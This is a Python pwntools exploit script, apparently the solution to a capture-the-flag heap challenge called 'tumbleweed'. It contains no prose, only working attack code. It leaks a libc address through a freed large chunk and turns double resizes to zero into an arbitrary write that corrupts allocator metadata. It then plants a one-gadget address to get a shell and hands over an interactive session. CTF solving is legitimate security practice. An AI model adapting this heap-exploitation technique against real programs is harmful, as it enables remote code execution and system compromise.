#!/usr/bin/env python3

"""Pwn Script

Usage:
    solve.py debug
    solve.py local
    solve.py remote <ip> <port>
"""

from docopt import docopt
from pwn import *
opts = docopt(__doc__)

from pwn import *
context.binary = exe = ELF("tumbleweed_patched")
libc = exe.libc

context.terminal = ['tmux', 'splitw', '-h']

from enum import Enum

gdbscript = """
    b *0x1003f7f

    continue
"""

def spawn():
    if opts["debug"]:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    elif opts["local"]:
        return process([exe.path])
    elif opts["remote"]:
        return remote(opts["<ip>"], int(opts["<port>"]))

free_chunks = [True] * 16

class Allocator(Enum):
    c = 0
    page = 1
    smp = 2
    fixed = 3

def alloc(allocator, size, data=b""):
    global io, free_chunks
    io.sendlineafter(b"> ", b"0")

    idx = free_chunks.index(True)
    free_chunks[idx] = False
    io.sendlineafter(b"Which incubator? ", str(idx).encode())

    io.sendlineafter(b"Size? ", str(size).encode()) 

    io.sendlineafter(b"> ", str(allocator.value).encode())

    io.sendlineafter(b"Label:", data)

    return idx

def free(allocator, idx):
    global io, free_chunks
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Which incubator? ", str(idx).encode())
    io.sendlineafter(b"> ", str(allocator.value).encode())
    free_chunks[idx] = True

def view(idx):
    global io
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Which incubator? ", str(idx).encode())

    return io.recvuntil(b"Options")[:-7]

def resize(allocator, idx, size):
    global io
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Which incubator? ", str(idx).encode())
    io.sendlineafter(b"Target size: ", str(size).encode())
    io.sendlineafter(b"> ", str(allocator.value).encode())

bin_size = 0x10
def arbChunk(addr, data):
    global io, bin_size
    if bin_size == 64 * 1024:
        log.error("Too Many Writes!")

    evil_buf = alloc(Allocator.smp, bin_size)

    resize(Allocator.smp, evil_buf, 0)
    resize(Allocator.smp, evil_buf, 0)

    alloc(Allocator.smp, bin_size, p64(addr))
    alloc(Allocator.smp, bin_size, p64(0))
    ret_buf = alloc(Allocator.smp, bin_size, data)

    bin_size <<= 1
    return ret_buf


io = spawn()

c0 = alloc(Allocator.c, 0x418)
p0 = alloc(Allocator.c, 0x18)

free(Allocator.c, c0)

c0_leak = alloc(Allocator.c, 0x418)

leak = u64(view(c0_leak)[:8])
log.info(f"Libc Leak : {hex(leak)}")
libc.address = leak - 0x21ac0a
log.info(f"Libc : {hex(libc.address)}")


dummy = alloc(Allocator.page, 0x10, b"")

alloc(Allocator.fixed, 0x21, p64(libc.address + 0xebce2) * 4)
arbChunk(exe.sym["tumbleweed.heaps"] + 0x18, p64(exe.sym["tumbleweed.fba_buf"]))

resize(Allocator.page, dummy, 0)

io.interactive()
